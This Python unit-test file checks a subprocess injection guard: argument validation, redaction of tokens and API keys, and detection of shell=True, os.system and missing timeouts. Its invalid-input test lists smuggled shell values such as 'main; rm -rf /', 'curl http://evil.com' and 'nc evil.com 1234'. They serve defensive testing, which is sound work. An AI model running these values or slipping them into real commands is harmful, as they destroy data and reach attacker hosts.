#!/usr/bin/env python3
"""Unit tests for check_subprocess_injection_guard.py (T-0289)."""
from __future__ import annotations

import ast
import tempfile
import unittest
from pathlib import Path

from tasks.check_subprocess_injection_guard import (
    SAFE_PARAM_REGEX,
    Finding,
    SubprocessVisitor,
    assert_safe_arg,
    redact_sensitive_command,
    scan_python_file,
    validate_parameter,
)


class TestParameterValidation(unittest.TestCase):
    def test_valid_parameters(self):
        valid = [
            "main",
            "feature/my-branch",
            "work/sentinel-security-t-0289",
            "tasks/board.json",
            "v1.5.0",
            "123",
            "senseiewok/cf-lab",
        ]
        for val in valid:
            self.assertTrue(validate_parameter(val), f"Expected {val} to be valid")
            self.assertEqual(assert_safe_arg(val), val)

    def test_invalid_parameters_command_injection(self):
        invalid = [
            "main; rm -rf /",
            "branch`whoami`",
            "ref && curl http://evil.com",
            "var | nc evil.com 1234",
            "branch$(id)",
            "arg with spaces",
            "newline\ninjection",
        ]
        for val in invalid:
            self.assertFalse(validate_parameter(val), f"Expected {val} to be invalid")
            with self.assertRaises(ValueError):
                assert_safe_arg(val)


class TestSensitiveDataRedaction(unittest.TestCase):
    def test_redact_token_flags(self):
        cmd = ["gh", "auth", "login", "--token", "ghp_secrettoken123456789"]
        redacted = redact_sensitive_command(cmd)
        self.assertEqual(redacted, ["gh", "auth", "login", "--token", "[REDACTED]"])

    def test_redact_key_equals_flags(self):
        cmd = ["python", "fetch.py", "--api_key=mysecretkey", "--url", "https://api.example.com"]
        redacted = redact_sensitive_command(cmd)
        self.assertEqual(
            redacted,
            ["python", "fetch.py", "--api_key=[REDACTED]", "--url", "https://api.example.com"],
        )

    def test_safe_command_unmodified(self):
        cmd = ["git", "fetch", "origin", "main"]
        redacted = redact_sensitive_command(cmd)
        self.assertEqual(redacted, cmd)


class TestSubprocessASTVisitor(unittest.TestCase):
    def _scan_snippet(self, code: str, is_test: bool = False) -> list[Finding]:
        tree = ast.parse(code)
        visitor = SubprocessVisitor("dummy.py", is_test_file=is_test)
        visitor.visit(tree)
        return visitor.findings

    def test_shell_true_detected(self):
        code = "subprocess.run(['git', 'status'], shell=True, timeout=10)"
        findings = self._scan_snippet(code)
        self.assertTrue(any(f.rule == "SHELL_TRUE_FORBIDDEN" and f.severity == "ERROR" for f in findings))

    def test_os_system_detected(self):
        code = "import os; os.system('ls -la')"
        findings = self._scan_snippet(code)
        self.assertTrue(any(f.rule == "FORBIDDEN_SHELL_API" and f.severity == "ERROR" for f in findings))

    def test_string_command_detected_in_prod(self):
        code = "subprocess.run('git status', timeout=10)"
        findings = self._scan_snippet(code, is_test=False)
        self.assertTrue(any(f.rule == "STRING_COMMAND_FORBIDDEN" and f.severity == "ERROR" for f in findings))

    def test_missing_timeout_detected_in_prod(self):
        code = "subprocess.run(['git', 'status'])"
        findings = self._scan_snippet(code, is_test=False)
        self.assertTrue(any(f.rule == "MISSING_EXECUTION_TIMEOUT" and f.severity == "WARNING" for f in findings))

    def test_safe_subprocess_call_clean(self):
        code = "subprocess.run(['git', 'status'], timeout=30)"
        findings = self._scan_snippet(code, is_test=False)
        self.assertEqual(len(findings), 0)


class TestFileScanning(unittest.TestCase):
    def test_scan_python_file(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            f = Path(tmpdir) / "sample.py"
            f.write_text("subprocess.run(['git', 'status'], timeout=10)\n", encoding="utf-8")
            findings = scan_python_file(f, is_test_file=False)
            self.assertEqual(len(findings), 0)


if __name__ == "__main__":
    unittest.main()
